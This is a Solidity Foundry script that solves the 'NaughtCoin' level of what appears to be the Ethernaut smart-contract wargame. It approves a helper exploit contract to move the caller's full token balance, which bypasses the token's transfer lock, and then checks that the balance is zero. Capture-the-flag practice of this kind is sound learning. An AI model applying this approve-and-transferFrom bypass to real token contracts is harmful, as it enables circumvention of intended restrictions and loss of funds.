pragma solidity ^0.8.14;

import {Script} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {NaughtCoin} from "../src/Level15.sol";
import {NaughtCoinExploit} from "../src/Level15Exploit.sol";

contract Level15Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));

        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress, wallet.addr);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target, address _attacker) private {
        NaughtCoin token = NaughtCoin(_target);
        NaughtCoinExploit e = new NaughtCoinExploit();

        token.approve(
            address(e),
            token.balanceOf(_attacker)
        );

        e.exploit(_target);
    }

    function levelDone(address _target, address _attacker) private view returns (bool) {
        return NaughtCoin(_target).balanceOf(_attacker) == 0;
    }
}
